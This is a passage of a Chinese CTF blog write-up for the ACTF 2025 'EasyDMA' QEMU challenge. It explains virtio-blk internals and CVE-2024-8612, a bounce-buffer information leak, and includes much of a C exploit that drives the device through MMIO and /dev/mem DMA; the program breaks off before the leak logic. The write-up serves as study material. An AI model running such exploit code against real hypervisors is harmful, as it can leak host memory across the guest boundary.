list\n很遗憾本题没有解出，因为前面较少接触的堆题耗费了我挺多心力的，到这已经没什么精力去做了。不过收获很多，是大于遗憾的。\n明年见！\n平台很好看，出题人很热心，题目很难（\nhgame{see_you_next_year!!!}\n","categories":["CTF"],"tags":["pwn","hgame"]},{"title":"QEMU PWN - EasyDMA","url":"/categories/CTF/easydma/","content":"EasyDMA\nFrom: ACTF 2025\n题目给出一个去符号的 qemu 二进制文件\nqemu-system-x86_64，启动参数如下\n#!/bin/shtimeout --foreground 300 ./qemu-system-x86_64 \\    -L pc-bios \\    -m 1024 \\    -kernel bzImage \\    -initrd rootfs.cpio \\    -drive file=null-co://,if=none,id=mydisk \\    -device virtio-blk-pci,drive=mydisk,ioeventfd=off \\    -device readflag \\    -append \"priority=low console=ttyS0\" \\    -monitor /dev/null \\    -nographic\n\n添加两个设备 virtio-blk-pci, readflag。\n反汇编可以找到 readflag 通过 mmio 的读、写回调函数：\n__int64 __fastcall readflag_mmio_read(__int64 opaque, unsigned __int64 addr, int size){  __int64 result; // rax  if ( addr &gt; 0x7F )  {    result = -1LL;    if ( size != 4 )      return result;  }  else if ( size != 4 )  {    result = -1LL;    if ( size != 8 )      return result;  }  result = 0xDEADBEEFLL;  if ( addr )  {    if ( addr == 8 )      return *(_QWORD *)(opaque + 2984);    else      return -1LL;  }  return result;}\nvoid __fastcall readflag_mmio_write(__int64 opaque, unsigned __int64 addr, size_t val, int size){  void *v4; // rbp  FILE *v5; // rax  FILE *v6; // r12  size_t v7; // rax  int v8; // [rsp+0h] [rbp-20h]  if ( addr &gt; 0x7F )  {    if ( size != 4 )      return;  }  else if ( size != 4 )  {    if ( size == 8 &amp;&amp; addr == 8 )      goto LABEL_6;    return;  }  if ( addr )  {    if ( addr == 8 )LABEL_6:      *(_QWORD *)(opaque + 2984) = val;  }  else if ( val &lt;= 0xFFF )  {    v8 = val;    v4 = malloc(val);    if ( v4 )    {      v5 = fopen64(\"flag\", \"r\");      v6 = v5;      if ( v5 )      {        v7 = fread(v4, 1uLL, (unsigned int)(v8 - 1), v5);        if ( v7 )          *((_BYTE *)v4 + v7) = 0;        else          puts(\"No data read from the file.\");        free(v4);        fclose(v6);      }      else      {        perror(\"Error opening file\");        free(v4);      }    }    else    {      perror(\"Memory allocation failed\");    }  }}\nVirtio Block Device1\nData types definition\nFor the integer data types used in the structure definitions, the\nfollowing conventions are used:\n\nu8, u16, u32, u64\nAn unsigned integer of the specified length in bits.\nle16, le32, le64\nAn unsigned integer of the specified length in bits, in little-endian\nbyte order.\n\n#define u8 uint8_t#define u16 uint16_t#define u32 uint32_t#define u64 uint64_t#define le16 u16#define le32 u32#define le64 u64\nPCI Capabilities\nstruct virtio_pci_cap {    u8 cap_vndr; /* Generic PCI field: PCI_CAP_ID_VNDR */    u8 cap_next; /* Generic PCI field: next ptr. */    u8 cap_len; /* Generic PCI field: capability length */    u8 cfg_type; /* Identifies the structure. */    u8 bar; /* Where to find it. */    u8 id; /* Multiple capabilities of the same type */    u8 padding[2]; /* Pad to full dword. */    le32 offset; /* Offset within bar. */    le32 length; /* Length of the structure, in bytes. */};\ncfg_type identifies the structure,\naccording to the following table:\n/* Common configuration */#define VIRTIO_PCI_CAP_COMMON_CFG 1/* Notifications */#define VIRTIO_PCI_CAP_NOTIFY_CFG 2/* ISR Status */#define VIRTIO_PCI_CAP_ISR_CFG 3/* Device specific configuration */#define VIRTIO_PCI_CAP_DEVICE_CFG 4/* PCI configuration access */#define VIRTIO_PCI_CAP_PCI_CFG 5/* Shared memory region */#define VIRTIO_PCI_CAP_SHARED_MEMORY_CFG 8/* Vendor-specific data */#define VIRTIO_PCI_CAP_VENDOR_CFG 9\nFor common configuration, its layout is\nbelow:\nstruct virtio_pci_common_cfg {    /* About the whole device. */    le32 device_feature_select; /* read-write */    le32 device_feature; /* read-only for driver */    le32 driver_feature_select; /* read-write */    le32 driver_feature; /* read-write */    le16 config_msix_vector; /* read-write */    le16 num_queues; /* read-only for driver */    u8 device_status; /* read-write */    u8 config_generation; /* read-only for driver */    /* About a specific virtqueue. */    le16 queue_select; /* read-write */    le16 queue_size; /* read-write */    le16 queue_msix_vector; /* read-write */    le16 queue_enable; /* read-write */    le16 queue_notify_off; /* read-only for driver */    le64 queue_desc; /* read-write */    le64 queue_driver; /* read-write */    le64 queue_device; /* read-write */    le16 queue_notif_config_data; /* read-only for driver */    le16 queue_reset; /* read-write */    /* About the administration virtqueue. */    le16 admin_queue_index; /* read-only for driver */    le16 admin_queue_num; /* read-only for driver */};\nFor notification, its layout is below:\nstruct virtio_pci_notify_cap {    struct virtio_pci_cap cap;    le32 notify_off_multiplier; /* Multiplier for queue_notify_off. */};\nWe recognize these type, and record the offset.\nvoid print_cap(struct virtio_pci_cap* cap){    printf(\"cap_len: %x\\n\", cap-&gt;cap_len);    switch(cap-&gt;cfg_type){        case VIRTIO_PCI_CAP_COMMON_CFG:            printf(\"cfg_type: common\\n\");            break;        case VIRTIO_PCI_CAP_NOTIFY_CFG:            printf(\"cfg_type: notify\\n\");            break;        case VIRTIO_PCI_CAP_ISR_CFG:            printf(\"cfg_type: isr\\n\");            break;        case VIRTIO_PCI_CAP_DEVICE_CFG:            printf(\"cfg_type: device\\n\");            break;        case VIRTIO_PCI_CAP_PCI_CFG:            printf(\"cfg_type: pci\\n\");            break;        case VIRTIO_PCI_CAP_SHARED_MEMORY:            printf(\"cfg_type: shared memory\\n\");            break;        case VIRTIO_PCI_CAP_VENDOR_CFG:            printf(\"cfg_type: vendor\\n\");            break;        default:            printf(\"cfg_type: unknown\\n\");            break;    }    printf(\"bar: %x\\n\", cap-&gt;bar);    printf(\"id: %x\\n\", cap-&gt;id);    printf(\"offset: %x\\n\", cap-&gt;offset);    printf(\"length: %x\\n\", cap-&gt;length);}switch(cap.cfg_type){            case VIRTIO_PCI_CAP_COMMON_CFG:                virtio_common_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_NOTIFY_CFG:                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);                break;            case VIRTIO_PCI_CAP_ISR_CFG:                virtio_isr_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_DEVICE_CFG:                virtio_device_mmio = virtio_mmio + cap.offset;                break;            default:                break;        }\nVirtqueue2\nThe mechanism for bulk data transport on virtio devices is\npretentiously called a virtqueue. Each device can have zero or more\nvirtqueues.\nEach virtqueue can consist of up to 3 parts:\n​ • Descriptor Area - used for describing buffers\n​ • Driver Area - extra data supplied by driver to the device. Also\ncalled avail virtqueue.\n​ • Device Area - extra data supplied by device to driver. Also called\nused virtqueue.\n\n\nShared memory with split ring\nelements\n\nThere areas structure defined below:\nstruct virtq_desc {    /* Address (guest-physical). */    le64 addr;    /* Length. */    le32 len;/* This marks a buffer as continuing via the next field. */#define VIRTQ_DESC_F_NEXT 1/* This marks a buffer as device write-only (otherwise device read-only). */#define VIRTQ_DESC_F_WRITE 2/* This means the buffer contains a list of buffer descriptors. */#define VIRTQ_DESC_F_INDIRECT 4    /* The flags as indicated above. */    le16 flags;    /* Next field if flags &amp; NEXT */    le16 next;};struct virtq_avail {#define VIRTQ_AVAIL_F_NO_INTERRUPT 1    le16 flags;    le16 idx;    le16 ring[VIRTIO_QUEUE_SIZE];    le16 used_event; /* Only if VIRTIO_F_EVENT_IDX */};struct virtq_used_elem {    /* Index of start of used descriptor chain. */    le32 id;    /*    * The number of bytes written into the device writable portion of    * the buffer described by the descriptor chain.    */    le32 len;};struct virtq_used {#define VIRTQ_USED_F_NO_NOTIFY 1    le16 flags;    le16 idx;    struct virtq_used_elem ring[VIRTIO_QUEUE_SIZE];    le16 avail_event; /* Only if VIRTIO_F_EVENT_IDX */};\n\nThe driver queues requests to the virtqueue, the type of the request\nis either a read (VIRTIO_BLK_T_IN), a write (VIRTIO_BLK_T_OUT), a\ndiscard (VIRTIO_BLK_T_DISCARD), a write zeroes\n(VIRTIO_BLK_T_WRITE_ZEROES) or a flush (VIRTIO_BLK_T_FLUSH).\nstruct virtio_blk_req {         le32 type;         le32 reserved;         le64 sector;         u8 data[][512];         u8 status; };  struct virtio_blk_discard_write_zeroes {        le64 sector;        le32 num_sectors;        struct {                le32 unmap:1;                le32 reserved:31;        } flags; };#define VIRTIO_BLK_T_IN           0 #define VIRTIO_BLK_T_OUT          1 #define VIRTIO_BLK_T_FLUSH        4 #define VIRTIO_BLK_T_DISCARD      11 #define VIRTIO_BLK_T_WRITE_ZEROES 13\nMMIO3\nMemory-mapped I/O (MMIO) uses the\nsame address space to address both main memory and I/O devices. The\nmemory and registers of the I/O devices are mapped to (associated with)\naddress values, so a memory address may refer to either a portion of\nphysical RAM or to memory and registers of the I/O device.\nuint8_t mmio_read8(void* addr){    return *(volatile uint8_t*)addr;}uint16_t mmio_read16(void* addr){    return *(volatile uint16_t*)addr;}uint32_t mmio_read32(void* addr){    return *(volatile uint32_t*)addr;}uint64_t mmio_read64(void* addr){    return *(volatile uint64_t*)addr;}void mmio_write8(void* addr, uint8_t val){    *(volatile uint8_t*)addr = val;}void mmio_write16(void* addr, uint16_t val){    *(volatile uint16_t*)addr = val;}void mmio_write32(void* addr, uint32_t val){    *(volatile uint32_t*)addr = val;}void mmio_write64(void* addr, uint64_t val){    *(volatile uint64_t*)addr = val;}\nDevice configuration layout\nstruct virtio_blk_config {        le64 capacity;        le32 size_max;        le32 seg_max;    struct virtio_blk_geometry {        le16 cylinders;        u8 heads;        u8 sectors;    } geometry;    le32 blk_size;    struct virtio_blk_topology {        // # of logical blocks per physical block (log2)        u8 physical_block_exp;        // offset of first aligned logical block        u8 alignment_offset;        // suggested minimum I/O size in blocks        le16 min_io_size;        // optimal (suggested maximum) I/O size in blocks        le32 opt_io_size;    } topology;    u8 writeback;    u8 unused0;    u16 num_queues;    le32 max_discard_sectors;    le32 max_discard_seg;    le32 discard_sector_alignment;    le32 max_write_zeroes_sectors;    le32 max_write_zeroes_seg;    u8 write_zeroes_may_unmap;    u8 unused1[3];    le32 max_secure_erase_sectors;    le32 max_secure_erase_seg;    le32 secure_erase_sector_alignment;    struct virtio_blk_zoned_characteristics {        le32 zone_sectors;        le32 max_open_zones;        le32 max_active_zones;        le32 max_append_sectors;        le32 write_granularity;        u8 model;        u8 unused2[3];    } zoned;};\nInitialization\n\nRead capabilities\nReset device\nReset Virtqueue\n\nvoid init_virtio() {    int fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/config\", O_RDONLY);    if(fd &lt; 0){        ERR(\"Open virtio config\");    }    struct virtio_pci_cap cap;    char* config = malloc(0x1000);    int bytes_read = read(fd, config, 0x1000);    if(bytes_read &lt; 0){        ERR(\"Read virtio config\");    }    fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource4\", O_RDWR | O_SYNC);    if(fd &lt; 0){        ERR(\"Open virtio resource4\");    }    virtio_mmio = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);    if(virtio_mmio == (volatile void*)-1){        ERR(\"mmap virtio mem\");    }    close(fd);    u8 cap_ptr = *(u8*)(config+0x34);    while(cap_ptr != 0){        if(config[cap_ptr] != 0x9){            cap_ptr = *(u8*)(config+cap_ptr+1);            continue;        }        memcpy(&amp;cap, config+cap_ptr, sizeof(cap));        print_cap(&amp;cap);        switch(cap.cfg_type){            case VIRTIO_PCI_CAP_COMMON_CFG:                virtio_common_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_NOTIFY_CFG:                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);                break;            case VIRTIO_PCI_CAP_ISR_CFG:                virtio_isr_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_DEVICE_CFG:                virtio_device_mmio = virtio_mmio + cap.offset;                break;            default:                break;        }        cap_ptr = cap.cap_next;    }    close(fd);    free(config);    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 0);    printf(\"device_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 1);    printf(\"device_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);    printf(\"driver_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 1);    printf(\"driver_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));    struct virtio_blk_config* blk_cfg = (struct virtio_blk_config*)virtio_device_mmio;    printf(\"capacity: %lx\\n\", mmio_read64(&amp;blk_cfg-&gt;capacity));    printf(\"size_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;size_max));    printf(\"seg_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;seg_max));    printf(\"geometry.cylinders: %x\\n\", mmio_read16(&amp;blk_cfg-&gt;geometry.cylinders));    printf(\"geometry.heads: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.heads));    printf(\"geometry.sectors: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.sectors));    printf(\"blk_size: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;blk_size));    // reset device    mmio_write8(&amp;common_cfg-&gt;device_status, 0);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_ACKNOWLEDGE);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);    mmio_write32(&amp;common_cfg-&gt;driver_feature, 0); // disable all features    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    assert(mmio_read8(&amp;common_cfg-&gt;device_status) &amp; VIRTIO_CONFIG_S_FEATURES_OK);    // alloc dma memory    int dma_fd = open(\"/dev/mem\", O_RDWR | O_SYNC);    if(dma_fd &lt; 0){        ERR(\"Open dma\");    }    dma_mem = mmap((void*)0x3ffdd000, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0x3ffdd000);    if(dma_mem == (volatile void*)-1){        ERR(\"mmap dma mem\");    }    *(volatile uint32_t*)dma_mem = 0x12345678;    printf(\"%x\\n\", *(volatile uint32_t*)dma_mem);    *(volatile uint32_t*)dma_mem = 0;    printf(\"dma_mem: %p\\n\", dma_mem);    dma_data = dma_mem + 0x1000;    queue_desc = (struct virtq_desc*)dma_mem;    queue_avail = (struct virtq_avail*)((char*)queue_desc + 0x10 * VIRTIO_QUEUE_SIZE);    queue_used = (struct virtq_used*)((char*)dma_mem + 0x200);    // init queue    mmio_write16(&amp;common_cfg-&gt;queue_select, 0);    mmio_write16(&amp;common_cfg-&gt;queue_size, VIRTIO_QUEUE_SIZE);    mmio_write64(&amp;common_cfg-&gt;queue_desc, (size_t)0x3ffdd000);    mmio_write64(&amp;common_cfg-&gt;queue_driver, (size_t)0x3ffdd100);    mmio_write64(&amp;common_cfg-&gt;queue_device, (size_t)0x3ffdd200);    mmio_write16(&amp;common_cfg-&gt;queue_enable, 1);    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER_OK | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);    puts(\"virtio init done\");}\nVulnerabilities\nCVE-2024-8612\n从文件的字符串中可得知 qemu 的版本号为 qemu-8.0.0-rc2，存在一个关于 virtio-blk-pci 的信息泄漏漏洞:\nCVE-2024-8612\n具体利用还可以参考:\nHEXACON2024 -\nDMAKiller: DMA to Escape from QEMU/KVM by Yongkang Jia, Yiming Tao &amp;\nXiao Lei,\nACTF2025-EasyDMA\nWriteup\n当 DMA 访问的地址是 MMIO 的，会使用 bounce buffer\n/* Map a physical memory region into a host virtual address. * May map a subset of the requested range, given by and returned in *plen. * May return NULL if resources needed to perform the mapping are exhausted. * Use only for reads OR writes - not for read-modify-write operations. * Use cpu_register_map_client() to know when retrying the map operation is * likely to succeed. */void *address_space_map(AddressSpace *as,                        hwaddr addr,                        hwaddr *plen,                        bool is_write,                        MemTxAttrs attrs){    hwaddr len = *plen;    hwaddr l, xlat;    MemoryRegion *mr;    FlatView *fv;    if (len == 0) {        return NULL;    }    l = len;    RCU_READ_LOCK_GUARD();    fv = address_space_to_flatview(as);    mr = flatview_translate(fv, addr, &amp;xlat, &amp;l, is_write, attrs);    if (!memory_access_is_direct(mr, is_write)) {        if (qatomic_xchg(&amp;bounce.in_use, true)) {            *plen = 0;            return NULL;        }               /* Avoid unbounded allocations */        l = MIN(l, TARGET_PAGE_SIZE);        bounce.buffer = qemu_memalign(TARGET_PAGE_SIZE, l);        bounce.addr = addr;        bounce.len = l;        memory_region_ref(mr);        bounce.mr = mr;        if (!is_write) {            flatview_read(fv, addr, MEMTXATTRS_UNSPECIFIED,                               bounce.buffer, l);        }        *plen = l;        return bounce.buffer;    }\t//...}\n同时，通过 qemu_memalign 得到的内存并没有初始化。\nstatic int virtio_blk_handle_request(VirtIOBlockReq *req, MultiReqBuffer *mrb){    uint32_t type;    struct iovec *in_iov = req-&gt;elem.in_sg;    struct iovec *out_iov = req-&gt;elem.out_sg;    unsigned in_num = req-&gt;elem.in_num;    unsigned out_num = req-&gt;elem.out_num;    VirtIOBlock *s = req-&gt;dev;    VirtIODevice *vdev = VIRTIO_DEVICE(s);        if (req-&gt;elem.out_num &lt; 1 || req-&gt;elem.in_num &lt; 1) {        virtio_error(vdev, \"virtio-blk missing headers\");        return -1;    }    if (unlikely(iov_to_buf(out_iov, out_num, 0, &amp;req-&gt;out,                            sizeof(req-&gt;out)) != sizeof(req-&gt;out))) {        virtio_error(vdev, \"virtio-blk request outhdr too short\");        return -1;    }    iov_discard_front_undoable(&amp;out_iov, &amp;out_num, sizeof(req-&gt;out),                               &amp;req-&gt;outhdr_undo);    if (in_iov[in_num - 1].iov_len &lt; sizeof(struct virtio_blk_inhdr)) {        virtio_error(vdev, \"virtio-blk request inhdr too short\");        iov_discard_undo(&amp;req-&gt;outhdr_undo);        return -1;    }        //...        req-&gt;in_len = iov_size(in_iov, in_num);        //...        case VIRTIO_BLK_T_IN:    {        bool is_write = type &amp; VIRTIO_BLK_T_OUT;        req-&gt;sector_num = virtio_ldq_p(vdev, &amp;req-&gt;out.sector);        if (is_write) {            qemu_iovec_init_external(&amp;req-&gt;qiov, out_iov, out_num);            trace_virtio_blk_handle_write(vdev, req, req-&gt;sector_num,                                          req-&gt;qiov.size / BDRV_SECTOR_SIZE);        } else {            qemu_iovec_init_external(&amp;req-&gt;qiov, in_iov, in_num);            trace_virtio_blk_handle_read(vdev, req, req-&gt;sector_num,                                         req-&gt;qiov.size / BDRV_SECTOR_SIZE);        }        if (!virtio_blk_sect_range_ok(s, req-&gt;sector_num, req-&gt;qiov.size)) {            virtio_blk_req_complete(req, VIRTIO_BLK_S_IOERR);            block_acct_invalid(blk_get_stats(s-&gt;blk),                               is_write ? BLOCK_ACCT_WRITE : BLOCK_ACCT_READ);            virtio_blk_free_request(req);            return 0;        }        \t//...    default:    virtio_blk_req_complete(req, VIRTIO_BLK_S_UNSUPP);    virtio_blk_free_request(req);        }\n在 virtio_blk_handle_request，即使请求不合法，长度也被写入到 req-&gt;in_len。type 不合法时，直接调用 virtio_blk_req_complete\n调用链：virtio_blk_handle_request-&gt;virtio_blk_req_complete-&gt;virtqueue_push-&gt;virtqueue_fill-&gt;virtqueue_unmap_sg-&gt;dma_memory_unmap-&gt;address_space_unmap-&gt;address_space_write\nMemTxResult address_space_write(AddressSpace *as, hwaddr addr,                                MemTxAttrs attrs,                                const void *buf, int len){    MemTxResult result;    __bufread(buf, len);    return result;}\n由于缺乏保护，数据可以被写到 Common\nconfiguration 部分，并且部分空间可被读出。\nExploit\n通过堆喷，将 flag 字符串填充在内存中。利用上述漏洞读出内存内容。\n#include&lt;stddef.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;fcntl.h&gt;#include&lt;sys/mman.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;#include&lt;assert.h&gt;#include&lt;stdint.h&gt;#include&lt;sys/io.h&gt;#include&lt;linux/stddef.h&gt;#define u8 uint8_t#define u16 uint16_t#define u32 uint32_t#define u64 uint64_t#define le16 u16#define le32 u32#define le64 u64struct virtio_pci_cap {    u8 cap_vndr;    u8 cap_next;    u8 cap_len;    u8 cfg_type;    u8 bar;    u8 id;    u8 padding[2];    le32 offset;    le32 length;};struct virtio_pci_common_cfg {    /* About the whole device. */    le32 device_feature_select; /* read-write */    le32 device_feature; /* read-only for driver */    le32 driver_feature_select; /* read-write */    le32 driver_feature; /* read-write */    le16 config_msix_vector; /* read-write */    le16 num_queues; /* read-only for driver */    u8 device_status; /* read-write */    u8 config_generation; /* read-only for driver */    /* About a specific virtqueue. */    le16 queue_select; /* read-write */    le16 queue_size; /* read-write */    le16 queue_msix_vector; /* read-write */    le16 queue_enable; /* read-write */    le16 queue_notify_off; /* read-only for driver */    le64 queue_desc; /* read-write */    le64 queue_driver; /* read-write */    le64 queue_device; /* read-write */    le16 queue_notify_data; /* read-only for driver */    le16 queue_reset; /* read-write */};struct virtio_notify_cfg {    struct virtio_pci_cap cap;    le32 notify_off_multiplier;};struct virtio_blk_config{    le64 capacity;    le32 size_max;    le32 seg_max;    struct virtio_blk_geometry {        le16 cylinders;        u8 heads;        u8 sectors;    } geometry;    le32 blk_size;    struct virtio_blk_topology {        // # of logical blocks per physical block (log2)        u8 physical_block_exp;        // offset of first aligned logical block        u8 alignment_offset;        // suggested minimum I/O size in blocks        le16 min_io_size;        // optimal (suggested maximum) I/O size in blocks        le32 opt_io_size;    } topology;    u8 writeback;    u8 unused0;    u16 num_queues;    le32 max_discard_sectors;    le32 max_discard_seg;    le32 discard_sector_alignment;    le32 max_write_zeroes_sectors;    le32 max_write_zeroes_seg;    u8 write_zeroes_may_unmap;    u8 unused1[3];    le32 max_secure_erase_sectors;    le32 max_secure_erase_seg;    le32 secure_erase_sector_alignment;};enum virtio_pci_cfg_type{    VIRTIO_PCI_CAP_COMMON_CFG = 0x1,    VIRTIO_PCI_CAP_NOTIFY_CFG = 0x2,    VIRTIO_PCI_CAP_ISR_CFG = 0x3,    VIRTIO_PCI_CAP_DEVICE_CFG = 0x4,    VIRTIO_PCI_CAP_PCI_CFG = 0x5,    VIRTIO_PCI_CAP_SHARED_MEMORY = 0x8,    VIRTIO_PCI_CAP_VENDOR_CFG = 0x9,};/* Feature bits */#define VIRTIO_BLK_F_SIZE_MAX\t1\t/* Indicates maximum segment size */#define VIRTIO_BLK_F_SEG_MAX\t2\t/* Indicates maximum # of segments */#define VIRTIO_BLK_F_GEOMETRY\t4\t/* Legacy geometry available  */#define VIRTIO_BLK_F_RO\t\t5\t/* Disk is read-only */#define VIRTIO_BLK_F_BLK_SIZE\t6\t/* Block size of disk is available*/#define VIRTIO_BLK_F_FLUSH\t9\t/* Flush command supported */#define VIRTIO_BLK_F_TOPOLOGY\t10\t/* Topology information is available */#define VIRTIO_BLK_F_MQ\t\t12\t/* support more than one vq */#define VIRTIO_BLK_F_DISCARD\t13\t/* DISCARD is supported */#define VIRTIO_BLK_F_WRITE_ZEROES\t14\t/* WRITE ZEROES is supported */#define VIRTIO_BLK_F_SECURE_ERASE\t16 /* Secure Erase is supported *//* Status byte for guest to report progress, and synchronize features. *//* We have seen device and processed generic fields (VIRTIO_CONFIG_F_VIRTIO) */#define VIRTIO_CONFIG_S_ACKNOWLEDGE\t1/* We have found a driver for the device. */#define VIRTIO_CONFIG_S_DRIVER\t\t2/* Driver has used its parts of the config, and is happy */#define VIRTIO_CONFIG_S_DRIVER_OK\t4/* Driver has finished configuring features */#define VIRTIO_CONFIG_S_FEATURES_OK\t8/* Device entered invalid state, driver must reset it */#define VIRTIO_CONFIG_S_NEEDS_RESET\t0x40/* We've given up on this device. */#define VIRTIO_CONFIG_S_FAILED\t\t0x80#define VIRTIO_QUEUE_SIZE 0x10struct virtq_desc {    /* Address (guest-physical). */    le64 addr;    /* Length. */    le32 len;/* This marks a buffer as continuing via the next field. */#define VIRTQ_DESC_F_NEXT 1/* This marks a buffer as device write-only (otherwise device read-only). */#define VIRTQ_DESC_F_WRITE 2/* This means the buffer contains a list of buffer descriptors. */#define VIRTQ_DESC_F_INDIRECT 4    /* The flags as indicated above. */    le16 flags;    /* Next field if flags &amp; NEXT */    le16 next;};struct virtq_avail {#define VIRTQ_AVAIL_F_NO_INTERRUPT 1    le16 flags;    le16 idx;    le16 ring[VIRTIO_QUEUE_SIZE];    le16 used_event; /* Only if VIRTIO_F_EVENT_IDX */};struct virtq_used_elem {    /* Index of start of used descriptor chain. */    le32 id;    /*    * The number of bytes written into the device writable portion of    * the buffer described by the descriptor chain.    */    le32 len;};struct virtq_used {#define VIRTQ_USED_F_NO_NOTIFY 1    le16 flags;    le16 idx;    struct virtq_used_elem ring[VIRTIO_QUEUE_SIZE];    le16 avail_event; /* Only if VIRTIO_F_EVENT_IDX */};struct virtio_blk_req {    le32 type;    le32 reserved;    le64 sector;    u8 data[0];    // u8 status;};#define VIRTIO_BLK_T_IN 0#define VIRTIO_BLK_T_OUT 1#define VIRTIO_BLK_T_FLUSH 4#define VIRTIO_BLK_T_GET_ID 8#define VIRTIO_BLK_T_GET_LIFETIME 10#define VIRTIO_BLK_T_DISCARD 11#define VIRTIO_BLK_T_WRITE_ZEROES 13#define VIRTIO_BLK_T_SECURE_ERASE 14void print_cap(struct virtio_pci_cap* cap){    printf(\"cap_len: %x\\n\", cap-&gt;cap_len);    switch(cap-&gt;cfg_type){        case VIRTIO_PCI_CAP_COMMON_CFG:            printf(\"cfg_type: common\\n\");            break;        case VIRTIO_PCI_CAP_NOTIFY_CFG:            printf(\"cfg_type: notify\\n\");            break;        case VIRTIO_PCI_CAP_ISR_CFG:            printf(\"cfg_type: isr\\n\");            break;        case VIRTIO_PCI_CAP_DEVICE_CFG:            printf(\"cfg_type: device\\n\");            break;        case VIRTIO_PCI_CAP_PCI_CFG:            printf(\"cfg_type: pci\\n\");            break;        case VIRTIO_PCI_CAP_SHARED_MEMORY:            printf(\"cfg_type: shared memory\\n\");            break;        case VIRTIO_PCI_CAP_VENDOR_CFG:            printf(\"cfg_type: vendor\\n\");            break;        default:            printf(\"cfg_type: unknown\\n\");            break;    }    printf(\"bar: %x\\n\", cap-&gt;bar);    printf(\"id: %x\\n\", cap-&gt;id);    printf(\"offset: %x\\n\", cap-&gt;offset);    printf(\"length: %x\\n\", cap-&gt;length);}void ERR(const char* buf){    perror(buf);    abort();}void LOG(const char* buf){    write(2, buf, strlen(buf));}volatile char* readflag_mmio = NULL;volatile char* virtio_mmio = NULL;volatile char* virtio_common_mmio = NULL;volatile struct virtio_notify_cfg* virtio_notify_mmio = NULL;volatile char* virtio_isr_mmio = NULL;volatile char* virtio_device_mmio = NULL;volatile char* dma_mem = NULL;volatile char* dma_data = NULL;volatile struct virtq_desc* queue_desc = NULL;volatile struct virtq_avail* queue_avail = NULL;volatile struct virtq_used* queue_used = NULL;void init_readflag(){    int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:05.0/resource0\", O_RDWR | O_SYNC);    if(mmio_fd &lt; 0){        ERR(\"Open readflag\");    }    readflag_mmio = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if(readflag_mmio == (volatile void*)-1){        ERR(\"mmap mmio_mem\");    }    close(mmio_fd);    puts(\"readflag init done\");}uint8_t mmio_read8(void* addr){    return *(volatile uint8_t*)addr;}uint16_t mmio_read16(void* addr){    return *(volatile uint16_t*)addr;}uint32_t mmio_read32(void* addr){    return *(volatile uint32_t*)addr;}uint64_t mmio_read64(void* addr){    return *(volatile uint64_t*)addr;}void mmio_write8(void* addr, uint8_t val){    *(volatile uint8_t*)addr = val;}void mmio_write16(void* addr, uint16_t val){    *(volatile uint16_t*)addr = val;}void mmio_write32(void* addr, uint32_t val){    *(volatile uint32_t*)addr = val;}void mmio_write64(void* addr, uint64_t val){    *(volatile uint64_t*)addr = val;}void mb(){    asm volatile(\"mfence\":::\"memory\");}void init_virtio() {    int fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/config\", O_RDONLY);    if(fd &lt; 0){        ERR(\"Open virtio config\");    }    struct virtio_pci_cap cap;    char* config = malloc(0x1000);    int bytes_read = read(fd, config, 0x1000);    if(bytes_read &lt; 0){        ERR(\"Read virtio config\");    }    fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource4\", O_RDWR | O_SYNC);    if(fd &lt; 0){        ERR(\"Open virtio resource4\");    }    virtio_mmio = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);    if(virtio_mmio == (volatile void*)-1){        ERR(\"mmap virtio mem\");    }    close(fd);    u8 cap_ptr = *(u8*)(config+0x34);    while(cap_ptr != 0){        if(config[cap_ptr] != 0x9){            cap_ptr = *(u8*)(config+cap_ptr+1);            continue;        }        memcpy(&amp;cap, config+cap_ptr, sizeof(cap));        print_cap(&amp;cap);        switch(cap.cfg_type){            case VIRTIO_PCI_CAP_COMMON_CFG:                virtio_common_mmio = virtio_mmio + cap.offset;                break;            case VIRTIO_PCI_CAP_NOTIFY_CFG:                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + 